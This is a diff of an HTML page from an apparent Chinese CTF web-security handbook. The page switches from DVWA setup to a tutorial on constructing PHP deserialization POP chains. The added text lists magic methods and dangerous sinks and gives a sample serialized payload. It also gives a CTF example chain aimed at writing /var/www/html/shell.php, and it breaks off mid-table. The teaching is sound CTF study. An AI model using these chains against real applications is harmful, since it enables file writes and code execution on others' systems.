@@ -12,13 +12,13 @@
         <meta name="author" content="wilesanGH">
       
       
-        <link rel="canonical" href="https://github.com/wilesanGH/DVWA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <link rel="canonical" href="https://github.com/wilesanGH/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%A0%E9%93%BE%E6%B3%95/">
       
       
-        <link rel="prev" href="..">
+        <link rel="prev" href="../php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8B%E7%BB%8D/">
       
       
-        <link rel="next" href="../WebGoat%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">
+        <link rel="next" href="../php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB%E5%90%8D%E7%88%86%E7%A0%B4/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -26,7 +26,7 @@
     
     
       
-        <title>DVWA环境搭建 - CTF-Web修炼手册</title>
+        <title>PHP反序列化造链法 - CTF-Web修炼手册</title>
       
     
     
@@ -80,7 +80,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#dvwa" class="md-skip">
+        <a href="#pop" class="md-skip">
           跳转至
         </a>
       
@@ -114,7 +114,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              DVWA环境搭建
+              PHP反序列化造链法
             
           </span>
         </div>
@@ -244,8 +244,6 @@
   
   
   
-    
-  
   
     
     
@@ -253,13 +251,11 @@
   
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
-        <a href="./" class="md-tabs__link">
+      <li class="md-tabs__item">
+        <a href="../DVWA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="md-tabs__link">
           
   
   
@@ -308,6 +304,8 @@
   
   
   
+    
+  
   
     
     
@@ -315,10 +313,12 @@
   
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
+      <li class="md-tabs__item md-tabs__item--active">
         <a href="../php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8B%E7%BB%8D/" class="md-tabs__link">
           
   
@@ -485,31 +485,28 @@
       
   
   
-    
   
   
-  
     
     
     
     
-      
-        
-        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
         
           
-          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
             
   
   
@@ -522,7 +519,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             环境搭建
@@ -533,31 +530,28 @@
                 
   
   
-    
   
   
-  
     
     
     
     
       
       
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
         
           
-          
         
-      
-    
-    
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
-      
-        
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_1" >
         
           
-          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="">
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
             
   
   
@@ -570,7 +564,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2_1">
             <span class="md-nav__icon md-icon"></span>
             靶场环境
@@ -581,32 +575,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    DVWA环境搭建
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../DVWA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="md-nav__link">
         
   
   
@@ -617,86 +589,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#1-docker" class="md-nav__link">
-    <span class="md-ellipsis">
-      1. Docker 方式安装（推荐）
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="1. Docker 方式安装（推荐）">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#11-docker" class="md-nav__link">
-    <span class="md-ellipsis">
-      1.1 安装 Docker
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#12-dvwa" class="md-nav__link">
-    <span class="md-ellipsis">
-      1.2 部署 DVWA
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#2" class="md-nav__link">
-    <span class="md-ellipsis">
-      2. 初始化设置
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#3" class="md-nav__link">
-    <span class="md-ellipsis">
-      3. 常见问题
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#4" class="md-nav__link">
-    <span class="md-ellipsis">
-      4. 安全提示
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -838,13 +730,10 @@
       
       
         
-          
-          
-        
       
     
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
@@ -853,7 +742,7 @@
         <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
         
           
-          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="">
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
             
   
   
@@ -917,13 +806,10 @@
       
       
         
-          
-          
-        
       
     
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
@@ -932,7 +818,7 @@
         <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
         
           
-          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="">
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
             
   
   
@@ -1702,28 +1588,31 @@
       
   
   
+    
   
   
+  
     
     
     
     
+      
+        
+        
       
       
         
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
         
           
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
-        
-          
-          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
             
   
   
@@ -1736,7 +1625,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             PHP安全
@@ -1747,28 +1636,31 @@
                 
   
   
+    
   
   
+  
     
     
     
     
       
       
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
         
           
+          
         
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_1" >
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" checked>
         
           
-          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="">
             
   
   
@@ -1781,7 +1673,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_4_1">
             <span class="md-nav__icon md-icon"></span>
             PHP反序列化
@@ -1815,10 +1707,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%A0%E9%93%BE%E6%B3%95/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    PHP反序列化造链法
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1829,6 +1743,140 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      🌟 第一步：入口魔术方法
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🌟 第一步：入口魔术方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      🎯 找哪里能自动触发？
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      🌟 第二步：中转传递
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🌟 第二步：中转传递">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      🎯 找属性或者对象联动！
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      📚 常见的传递形式
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      🌟 第三步：敏感函数点
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🌟 第三步：敏感函数点">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      🎯 找能直接导致漏洞的地方！
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      🌟 第四步：控制属性值
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🌟 第四步：控制属性值">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      🎯 最后要安排好每个对象的属性值！
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      🌟 第五步：拼接 payload
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1901,10 +1949,13 @@
       
       
         
+          
+          
+        
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
@@ -1913,7 +1964,7 @@
         <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_2" >
         
           
-          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="">
             
   
   
@@ -2390,28 +2441,19 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#1-docker" class="md-nav__link">
+  <a href="#_1" class="md-nav__link">
     <span class="md-ellipsis">
-      1. Docker 方式安装（推荐）
+      🌟 第一步：入口魔术方法
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="1. Docker 方式安装（推荐）">
+    <nav class="md-nav" aria-label="🌟 第一步：入口魔术方法">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#11-docker" class="md-nav__link">
+  <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
-      1.1 安装 Docker
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#12-dvwa" class="md-nav__link">
-    <span class="md-ellipsis">
-      1.2 部署 DVWA
+      🎯 找哪里能自动触发？
     </span>
   </a>
   
@@ -2423,27 +2465,90 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#2" class="md-nav__link">
+  <a href="#_3" class="md-nav__link">
     <span class="md-ellipsis">
-      2. 初始化设置
+      🌟 第二步：中转传递
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🌟 第二步：中转传递">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      🎯 找属性或者对象联动！
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#3" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
     <span class="md-ellipsis">
-      3. 常见问题
+      📚 常见的传递形式
     </span>
   </a>
   
 </li>
+        
+      </ul>
+    </nav>
+  
+</li>
       
         <li class="md-nav__item">
-  <a href="#4" class="md-nav__link">
+  <a href="#_6" class="md-nav__link">
     <span class="md-ellipsis">
-      4. 安全提示
+      🌟 第三步：敏感函数点
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🌟 第三步：敏感函数点">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      🎯 找能直接导致漏洞的地方！
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      🌟 第四步：控制属性值
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🌟 第四步：控制属性值">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      🎯 最后要安排好每个对象的属性值！
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      🌟 第五步：拼接 payload
     </span>
   </a>
   
@@ -2468,91 +2573,348 @@
   
 
 
-<h1 id="dvwa">DVWA 环境搭建指南<a class="headerlink" href="#dvwa" title="Permanent link">&para;</a></h1>
-<p>DVWA (Damn Vulnerable Web Application) 是一个用于安全测试和教学的故意存在漏洞的 PHP/MySQL Web 应用程序。本指南将介绍多种安装方式。</p>
-<h2 id="1-docker">1. Docker 方式安装（推荐）<a class="headerlink" href="#1-docker" title="Permanent link">&para;</a></h2>
-<h3 id="11-docker">1.1 安装 Docker<a class="headerlink" href="#11-docker" title="Permanent link">&para;</a></h3>
-<blockquote>
-<p>访问 <a href="https://www.docker.com/products/docker-desktop/">Docker 官网</a> 下载 Docker Desktop</p>
-<p>根据系统提示完成安装</p>
-<p>启动 Docker Desktop</p>
-<p>打开终端，验证安装：</p>
-</blockquote>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>docker<span class="w"> </span>--version
+<h1 id="pop">🛠 <strong>POP链造链法！（超实战版）</strong><a class="headerlink" href="#pop" title="Permanent link">&para;</a></h1>
+<p>我们要像高手一样，<strong>自己造出一条可以打的漏洞链</strong>。
+ 整个过程分成 5 步。</p>
+<hr />
+<h2 id="_1">🌟 第一步：入口魔术方法<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="_2">🎯 找哪里能自动触发？<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>魔术方法</th>
+<th>场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>__destruct()</code></td>
+<td>对象销毁时（常见）</td>
+</tr>
+<tr>
+<td><code>__wakeup()</code></td>
+<td>unserialize() 时（常见）</td>
+</tr>
+<tr>
+<td><code>__toString()</code></td>
+<td>对象被字符串化时</td>
+</tr>
+<tr>
+<td><code>__call()</code>、<code>__callStatic()</code></td>
+<td>调用不存在的方法时</td>
+</tr>
+<tr>
+<td><code>__invoke()</code></td>
+<td>对象当函数调用时</td>
+</tr>
+</tbody>
+</table>
+<p><strong>注意</strong>：很多题目只要你一反序列化就 <code>__destruct()</code> 自动触发，所以特别常用！</p>
+<hr />
+<h2 id="_3">🌟 第二步：中转传递<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">🎯 找属性或者对象联动！<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>比如在 <code>__destruct()</code> 中有这样的代码：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">function __destruct() {</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">    $this-&gt;logger-&gt;log(&quot;bye&quot;);</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">}</span>
 </code></pre></div>
-<h3 id="12-dvwa">1.2 部署 DVWA<a class="headerlink" href="#12-dvwa" title="Permanent link">&para;</a></h3>
-<ol>
-<li>
-<p>拉取官方镜像：
-   <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>docker<span class="w"> </span>pull<span class="w"> </span>vulnerables/web-dvwa
-</code></pre></div></p>
-</li>
-<li>
-<p>运行容器：
-   <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>-dt<span class="w"> </span>-p<span class="w"> </span><span class="m">8082</span>:80<span class="w"> </span>vulnerables/web-dvwa
-</code></pre></div></p>
-</li>
-<li>
-<p>访问 DVWA：</p>
+<p>说明：</p>
+<ul>
+<li><code>$logger</code> 是一个对象</li>
+<li>你可以控制 <code>$logger</code></li>
+<li>你还能控制 <code>$logger-&gt;log()</code> 的逻辑！</li>
+</ul>
+<p>就可以继续往下连了！</p>
+<hr />
+<h3 id="_5">📚 常见的传递形式<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>代码</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$this-&gt;obj-&gt;method()</code></td>
+<td>对象调用方法</td>
+</tr>
+<tr>
+<td><code>$this-&gt;file = fopen($this-&gt;filename)</code></td>
+<td>调用文件函数</td>
+</tr>
+<tr>
+<td><code>$this-&gt;content = file_get_contents($this-&gt;url)</code></td>
+<td>读取网络文件</td>
+</tr>
+</tbody>
+</table>
+<p>只要能让 <code>$this-&gt;xxx</code> 可控，就能往后连！！</p>
+<hr />
+<h2 id="_6">🌟 第三步：敏感函数点<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<h3 id="_7">🎯 找能直接导致漏洞的地方！<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>漏洞</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>system()</code>、<code>exec()</code>、<code>shell_exec()</code></td>
+<td>命令执行</td>
+</tr>
+<tr>
+<td><code>include()</code>、<code>require()</code></td>
+<td>任意文件包含</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code>、<code>fopen()</code></td>
+<td>任意文件读</td>
+</tr>
+<tr>
+<td><code>unlink()</code>、<code>rmdir()</code></td>
+<td>文件删除</td>
+</tr>
+<tr>
+<td><code>file_put_contents()</code></td>
+<td>任意文件写（写马）</td>
+</tr>
+<tr>
+<td><code>preg_replace('/e'修饰符)</code></td>
+<td>代码执行（老版本PHP）</td>
+</tr>
+</tbody>
+</table>
+<p>一旦链子连到这里，就是起飞！</p>
+<hr />
+<h2 id="_8">🌟 第四步：控制属性值<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<h3 id="_9">🎯 最后要安排好每个对象的属性值！<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p>比如：</p>
+<ul>
+<li>如果某个地方 <code>system($this-&gt;cmd)</code>，你就让 <code>$cmd = "id"</code></li>
+<li>如果某个地方 <code>include($this-&gt;file)</code>，你就让 <code>$file = "php://filter/..."</code></li>
+</ul>
+<p>属性要根据链子的需要，一个一个安排好。</p>
+<hr />
+<h2 id="payload">🌟 第五步：拼接 payload<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h2>
+<p>最终，把链子里的对象用 <code>serialize()</code> 拼好，打出去！</p>
+<p>比如链子是：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">入口类 A （触发 __destruct） → B （触发 __toString） → C （执行 include）</span>
+</code></pre></div>
+<p>payload大概长这样：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">O:1:&quot;A&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;c&quot;;O:1:&quot;C&quot;:1:{s:4:&quot;file&quot;;s:15:&quot;php://filter/...&quot;;}}}</span>
+</code></pre></div>
+<p>然后 base64 编一下，urlencode 编一下，发请求炸！</p>
+<hr />
+<h1 id="_10">🚀🚀🚀 造链总结<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h1>
+<p><strong>口诀版记忆！</strong></p>
 <blockquote>
-<p>打开浏览器，访问 <code>http://localhost:8082</code></p>
-<p>默认登录凭据：</p>
-<p>用户名：<code>admin</code></p>
-<p>密码：<code>password</code></p>
+<p>找入口，连中转，控敏感，调参数，串成串！</p>
 </blockquote>
-</li>
-</ol>
-<h2 id="2">2. 初始化设置<a class="headerlink" href="#2" title="Permanent link">&para;</a></h2>
-<ol>
-<li>访问 DVWA：</li>
-</ol>
-<blockquote>
-<p>打开浏览器访问对应地址</p>
-<p>使用默认凭据登录</p>
-</blockquote>
-<ol>
-<li>初始化数据库：</li>
-</ol>
-<blockquote>
-<p>点击页面底部的 "Setup / Reset DB"</p>
-<p>点击 "Create / Reset Database" 按钮</p>
-</blockquote>
-<ol>
-<li>安全级别设置：</li>
-</ol>
-<blockquote>
-<p>登录后，点击 "DVWA Security"</p>
-<p>选择难度级别（Low/Medium/High/Impossible）</p>
-</blockquote>
-<h2 id="3">3. 常见问题<a class="headerlink" href="#3" title="Permanent link">&para;</a></h2>
-<ol>
-<li>数据库连接失败：</li>
-</ol>
-<blockquote>
-<p>检查数据库服务是否启动</p>
-<p>验证数据库凭据是否正确</p>
-<p>确认数据库用户权限</p>
-</blockquote>
-<ol>
-<li>文件权限问题：</li>
-</ol>
-<blockquote>
-<p>确保 Web 服务器对 DVWA 目录有正确的读写权限</p>
-<p>检查 <code>hackable/uploads/</code> 和 <code>/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</code> 的权限</p>
-</blockquote>
-<ol>
-<li>reCAPTCHA 问题：<blockquote>
-<p>如需使用 reCAPTCHA，需要在 <code>config.inc.php</code> 中配置有效的 API 密钥</p>
-</blockquote>
-</li>
-</ol>
-<h2 id="4">4. 安全提示<a class="headerlink" href="#4" title="Permanent link">&para;</a></h2>
-<blockquote>
-<p>DVWA 仅用于学习和测试目的</p>
-<p>不要在生产环境中部署</p>
-<p>建议在隔离的虚拟机或容器中运行</p>
-<p>完成练习后及时关闭环境 </p>
-</blockquote>
+<hr />
+<h1 id="ctf">🎯 举个完整 CTF实战链子例子：<a class="headerlink" href="#ctf" title="Permanent link">&para;</a></h1>
+<p>CTF赛题，源码有2个类：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="x">class Logger {</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="x">    public $logFile;</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="x">    function __destruct() {</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="x">        file_put_contents($this-&gt;logFile, &quot;Log end.&quot;);</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="x">    }</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="x">}</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="x">class Upload {</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="x">    public $filename;</span>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="x">    function __toString() {</span>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="x">        return $this-&gt;filename;</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="x">    }</span>
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="x">}</span>
+</code></pre></div>
+<ul>
+<li><code>Logger</code> 的 <code>__destruct()</code> 用了 <code>$this-&gt;logFile</code></li>
+<li>如果 <code>$logFile</code> 是一个 <code>Upload</code> 对象</li>
+<li>调用 <code>file_put_contents($Upload)</code> 时，会触发 <code>Upload-&gt;__toString()</code></li>
+<li><code>__toString()</code> 返回 <code>$filename</code></li>
+<li>最终 file_put_contents() 写到你指定的地方！</li>
+</ul>
+<p><strong>payload构造思路：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="x">$u = new Upload();</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="x">$u-&gt;filename = &quot;/var/www/html/shell.php&quot;; // 写到shell</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="x">$l = new Logger();</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="x">$l-&gt;logFile = $u; // 让logFile是Upload对象</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="x">echo urlencode(serialize($l));</span>
+</code></pre></div>
+<p>就可以打文件写了！！💥</p>
+<hr />
+<h1 id="_11">❗ 最后给你一份必杀表：常见魔术方法触发点<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h1>
+<table>
+<thead>
+<tr>
+<th>魔术方法</th>
+<th>触发时机</th>
+<th>常见链子起点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>__destruct</code></td>
+<td>对象销毁</td>
+<td>90%题目都用</td>
+</tr>
+<tr>
+<td><code>__wakeup</code></td>
+<td>unserialize后</td>
+<td>有些题特意用 wakeup</td>
+</tr>
+<tr>
+<td><code>__toString</code></td>
+<td>对象当字符串用</td>
+<td>结合 include()、file_put_contents()</td>
+</tr>
+<tr>
+<td><code>__call</code></td>
+<td>调用未定义方法</td>
+<td>适合接连其他类</td>
+</tr>
+<tr>
